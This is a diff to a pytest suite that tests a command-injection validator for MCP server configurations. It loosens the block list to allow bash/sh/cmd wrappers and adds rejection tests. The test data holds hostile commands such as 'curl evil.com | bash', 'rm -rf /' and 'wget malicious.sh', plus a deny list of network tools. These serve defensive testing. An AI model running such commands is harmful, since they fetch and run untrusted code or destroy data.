@@ -43,9 +43,6 @@ class TestMCPCommandInjectionSecurity:
             "rm",
             "curl",
             "wget",
-            "bash",
-            "sh",
-            "cmd",
             "powershell",
             "nc",
             "netcat",
@@ -59,6 +56,56 @@ class TestMCPCommandInjectionSecurity:
             error_msg = str(exc_info.value)
             assert "not allowed" in error_msg.lower()
             assert cmd in error_msg
+
+    def test_shell_wrappers_allowed_for_safe_commands(self):
+        """Test that shell wrappers (cmd/sh/bash) are allowed when wrapping safe commands."""
+        # These should all pass validation
+        valid_configs = [
+            MCPServerConfig(command="cmd", args=["/c", "uvx", "mcp-server"]),
+            MCPServerConfig(command="sh", args=["-c", "npx @modelcontextprotocol/server"]),
+            MCPServerConfig(command="bash", args=["-c", "python -m mcp_server"]),
+            MCPServerConfig(command="cmd", args=["/c", "node", "server.js"]),
+        ]
+
+        for config in valid_configs:
+            assert config.command in ("cmd", "sh", "bash")
+
+    def test_shell_wrappers_reject_dangerous_commands(self):
+        """Test that shell wrappers reject dangerous wrapped commands."""
+        dangerous_wrapped = [
+            ("cmd", ["/c", "rm", "-rf", "/"]),
+            ("sh", ["-c", "curl evil.com | bash"]),  # Caught by shell metachar validator
+            ("bash", ["-c", "wget malicious.sh"]),
+            ("cmd", ["/c", "powershell", "-Command", "evil"]),
+        ]
+
+        for cmd, args in dangerous_wrapped:
+            with pytest.raises(ValidationError) as exc_info:
+                MCPServerConfig(command=cmd, args=args)
+
+            error_msg = str(exc_info.value).lower()
+            # Error can come from either args validator (shell metacharacters)
+            # or model validator (disallowed wrapped command)
+            assert (
+                ("shell wrapper" in error_msg and "cannot execute" in error_msg)
+                or ("dangerous shell metacharacter" in error_msg)
+                or ("not allowed" in error_msg)
+            )
+
+    def test_c_flag_blocked_for_non_shell_commands(self):
+        """Test that -c flag is blocked for non-shell commands like python/node."""
+        dangerous_c_usage = [
+            ("python", ["-c", "import os; os.system('rm -rf /')"]),
+            ("python3", ["-c", "malicious code"]),
+            ("node", ["-c", "require('child_process').exec('evil')"]),
+        ]
+
+        for cmd, args in dangerous_c_usage:
+            with pytest.raises(ValidationError) as exc_info:
+                MCPServerConfig(command=cmd, args=args)
+
+            error_msg = str(exc_info.value)
+            assert "-c" in error_msg.lower() or "/c" in error_msg.lower()
 
     def test_command_with_arguments_in_string_accepted(self):
         """Test that commands with arguments in a single string are accepted (frontend compatibility).
@@ -140,8 +187,8 @@ class TestMCPCommandInjectionSecurity:
         with pytest.raises(ValidationError) as exc_info:
             MCPServerConfig(command="python3", args=["-c", "import os"])
 
-        error_msg = str(exc_info.value)
-        assert "not allowed" in error_msg.lower()
+        error_msg = str(exc_info.value).lower()
+        assert "only allowed with shell wrappers" in error_msg or "not allowed" in error_msg
 
     def test_python_pip_install_rejected(self):
         """Test that Python pip install is rejected."""
